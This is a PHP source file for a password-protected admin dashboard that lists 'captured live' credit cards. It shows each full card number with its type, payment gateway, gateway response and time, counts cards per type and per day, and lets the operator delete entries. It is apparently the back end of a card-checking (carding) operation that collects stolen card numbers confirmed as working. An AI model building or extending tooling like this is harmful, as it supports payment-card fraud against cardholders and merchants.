<?php
/**
 * Admin Panel - Live CC Statistics
 * Simple admin panel to view captured live CC results
 */

session_start();

// --- Credentials (hashed) ---
define('ADMIN_USER', 'mpragans');
define('ADMIN_PASS_HASH', '$2y$10$IKKoBnq7aX23MRJ/lAj1/e.S9HXECshJCVUSHyOBxsf9i4/N.WJdu');

$DATA_FILE = __DIR__ . '/../data/live_cards.json';

// --- Auth ---
function isLoggedIn() {
    return isset($_SESSION['admin_logged_in']) && $_SESSION['admin_logged_in'] === true;
}

// Handle logout
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
    exit;
}

// Handle delete
if (isLoggedIn() && isset($_POST['delete_index'])) {
    $index = intval($_POST['delete_index']);
    $cards = loadCards($DATA_FILE);
    if (isset($cards[$index])) {
        array_splice($cards, $index, 1);
        file_put_contents($DATA_FILE, json_encode($cards, JSON_PRETTY_PRINT), LOCK_EX);
    }
    header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
    exit;
}

// Handle clear all
if (isLoggedIn() && isset($_POST['clear_all']) && $_POST['clear_all'] === 'confirm') {
    file_put_contents($DATA_FILE, json_encode([], JSON_PRETTY_PRINT), LOCK_EX);
    header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
    exit;
}

// Handle login
$loginError = '';
if (isset($_POST['username'], $_POST['password'])) {
    if ($_POST['username'] === ADMIN_USER && password_verify($_POST['password'], ADMIN_PASS_HASH)) {
        $_SESSION['admin_logged_in'] = true;
        header('Location: ' . $_SERVER['REQUEST_URI']);
        exit;
    } else {
        $loginError = 'Invalid username or password.';
    }
}

function loadCards($file) {
    if (!file_exists($file)) return [];
    $data = json_decode(file_get_contents($file), true);
    return is_array($data) ? $data : [];
}

// --- If not logged in, show login form ---
if (!isLoggedIn()) {
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Admin Login</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Inter',sans-serif;background:#1a1b1e;color:#a0a3b1;min-height:100vh;display:flex;align-items:center;justify-content:center}
.login-box{background:#26272c;border-radius:12px;padding:2rem;width:100%;max-width:360px;box-shadow:0 8px 32px rgba(0,0,0,.25)}
.login-box h2{color:#fff;text-align:center;margin-bottom:1.5rem;font-size:1.2rem}
.login-box input{width:100%;padding:.7rem 1rem;margin-bottom:1rem;border:1px solid #3a3b40;border-radius:8px;background:#1a1b1e;color:#fff;font-size:.9rem;outline:none}
.login-box input:focus{border-color:#3b82f6}
.login-box button{width:100%;padding:.7rem;border:none;border-radius:8px;background:#10b981;color:#fff;font-weight:600;cursor:pointer;font-size:.9rem}
.login-box button:hover{background:#059669}
.error{color:#ef4444;text-align:center;margin-bottom:1rem;font-size:.85rem}
</style>
</head>
<body>
<div class="login-box">
  <h2>Admin Panel</h2>
  <?php if ($loginError): ?><div class="error"><?= htmlspecialchars($loginError) ?></div><?php endif; ?>
  <form method="post">
    <input type="text" name="username" placeholder="Username" required autocomplete="username">
    <input type="password" name="password" placeholder="Password" required autocomplete="current-password">
    <button type="submit">Login</button>
  </form>
</div>
</body>
</html>
<?php
    exit;
}

// --- Logged in: show dashboard ---
$cards = loadCards($DATA_FILE);
$totalLive = count($cards);

// Count by card type
$byType = [];
foreach ($cards as $c) {
    $type = $c['card_type'] ?? 'Unknown';
    $byType[$type] = ($byType[$type] ?? 0) + 1;
}

// Count today
$today = date('Y-m-d');
$todayCount = 0;
foreach ($cards as $c) {
    if (isset($c['timestamp']) && str_starts_with($c['timestamp'], $today)) {
        $todayCount++;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Admin Panel - Live Cards</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Inter',sans-serif;background:#1a1b1e;color:#a0a3b1;min-height:100vh;padding:1.5rem}
.container{max-width:1000px;margin:0 auto}
.header{display:flex;justify-content:space-between;align-items:center;margin-bottom:1.5rem}
.header h1{color:#fff;font-size:1.3rem}
.btn-logout{background:#ef4444;color:#fff;border:none;padding:.5rem 1rem;border-radius:8px;cursor:pointer;font-size:.85rem;text-decoration:none}
.btn-logout:hover{background:#dc2626}
.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:1rem;margin-bottom:1.5rem}
.stat-card{background:#26272c;border-radius:12px;padding:1.2rem;text-align:center;box-shadow:0 2px 8px rgba(0,0,0,.15)}
.stat-card .number{font-size:2rem;font-weight:700;color:#10b981}
.stat-card .label{font-size:.8rem;color:#616370;margin-top:.3rem}
.table-wrap{background:#26272c;border-radius:12px;overflow:hidden;box-shadow:0 4px 16px rgba(0,0,0,.2)}
.table-header{display:flex;justify-content:space-between;align-items:center;padding:1rem 1.2rem;border-bottom:1px solid #3a3b40}
.table-header h2{color:#fff;font-size:1rem}
table{width:100%;border-collapse:collapse}
th{background:#2d2e33;color:#616370;font-size:.75rem;text-transform:uppercase;letter-spacing:.5px;padding:.7rem 1rem;text-align:left}
td{padding:.6rem 1rem;border-bottom:1px solid #2d2e33;font-size:.85rem;color:#a0a3b1}
tr:hover td{background:#2d2e33}
.badge{display:inline-block;padding:2px 8px;border-radius:6px;font-size:.75rem;font-weight:600}
.badge-live{background:rgba(16,185,129,.15);color:#10b981}
.btn-del{background:none;border:1px solid #ef4444;color:#ef4444;padding:3px 10px;border-radius:6px;cursor:pointer;font-size:.75rem}
.btn-del:hover{background:#ef4444;color:#fff}
.btn-clear{background:#ef4444;color:#fff;border:none;padding:.4rem .8rem;border-radius:6px;cursor:pointer;font-size:.8rem}
.btn-clear:hover{background:#dc2626}
.empty{text-align:center;padding:3rem;color:#616370}
.cc-num{font-family:monospace;color:#fff;font-size:.85rem}
</style>
</head>
<body>
<div class="container">
  <div class="header">
    <h1>Live CC Dashboard</h1>
    <a href="?logout=1" class="btn-logout">Logout</a>
  </div>

  <div class="stats">
    <div class="stat-card">
      <div class="number"><?= $totalLive ?></div>
      <div class="label">Total Live</div>
    </div>
    <div class="stat-card">
      <div class="number"><?= $todayCount ?></div>
      <div class="label">Today</div>
    </div>
    <?php foreach ($byType as $type => $count): ?>
    <div class="stat-card">
      <div class="number"><?= $count ?></div>
      <div class="label"><?= htmlspecialchars($type) ?></div>
    </div>
    <?php endforeach; ?>
  </div>

  <div class="table-wrap">
    <div class="table-header">
      <h2>Live Cards (<?= $totalLive ?>)</h2>
      <?php if ($totalLive > 0): ?>
      <form method="post" style="display:inline" onsubmit="return confirm('Clear ALL live cards?')">
        <input type="hidden" name="clear_all" value="confirm">
        <button type="submit" class="btn-clear">Clear All</button>
      </form>
      <?php endif; ?>
    </div>
    <?php if ($totalLive === 0): ?>
      <div class="empty">No live cards captured yet.</div>
    <?php else: ?>
    <table>
      <thead>
        <tr>
          <th>#</th>
          <th>Card</th>
          <th>Type</th>
          <th>Gateway</th>
          <th>Response</th>
          <th>Time</th>
          <th></th>
        </tr>
      </thead>
      <tbody>
        <?php foreach (array_reverse($cards, true) as $i => $c): ?>
        <tr>
          <td><?= $i + 1 ?></td>
          <td class="cc-num"><?= htmlspecialchars($c['card'] ?? '') ?></td>
          <td><span class="badge badge-live"><?= htmlspecialchars($c['card_type'] ?? 'Unknown') ?></span></td>
          <td><?= htmlspecialchars($c['gateway'] ?? '') ?></td>
          <td><?= htmlspecialchars($c['response'] ?? '') ?></td>
          <td><?= htmlspecialchars($c['timestamp'] ?? '') ?></td>
          <td>
            <form method="post" style="display:inline" onsubmit="return confirm('Delete this entry?')">
              <input type="hidden" name="delete_index" value="<?= $i ?>">
              <button type="submit" class="btn-del">Del</button>
            </form>
          </td>
        </tr>
        <?php endforeach; ?>
      </tbody>
    </table>
    <?php endif; ?>
  </div>
</div>
</body>
</html>
<?php exit; ?>
